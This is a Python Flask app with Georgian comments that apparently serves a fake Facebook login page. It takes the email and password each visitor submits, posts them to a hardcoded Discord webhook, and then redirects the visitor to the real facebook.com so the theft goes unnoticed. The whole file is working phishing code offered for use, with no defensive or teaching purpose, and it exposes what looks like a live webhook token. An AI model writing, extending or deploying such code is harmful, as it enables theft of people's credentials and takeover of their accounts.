from flask import Flask, render_template, request, redirect
import requests
import os

app = Flask(__name__)

# შენი დისქორდის ვებჰუკის ლინკი ჩასმულია აქ
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566159410508734495/ffm1r6pYFKtCy6KVpveGegogedj-wQZNAAoxDcu3TG0fpEPBIC9-nKrjt0zuLwRn2ZYV"

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # ვიღებთ იმ იმეილს და პაროლს, რაც ჩვენს index.html-შია ჩაწერილი
        email = request.form.get('email')
        password = request.form.get('password') 
        
        # თუ იუზერმა რამე ჩაწერა
        if email or password: 
            discord_data = {
                "content": f"🔔 **ახალი შესვლა (Facebook):**\n📧 იმეილი: `{email}`\n🔑 პაროლი: `{password}`"
            }
            try:
                requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
                print("მონაცემები წარმატებით გაიგზავნა დისქორდზე!")
            except Exception as e:
                print(f"შეცდომა Discord-ზე: {e}")

            # ვაგდებთ ნამდვილ Facebook-ზე, თითქოს იუზერი წარმატებით შევიდა
            return redirect('https://www.facebook.com')

    # თუ გვერდი პირველად იტვირთება, ვაჩვენებთ დიზაინს
    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)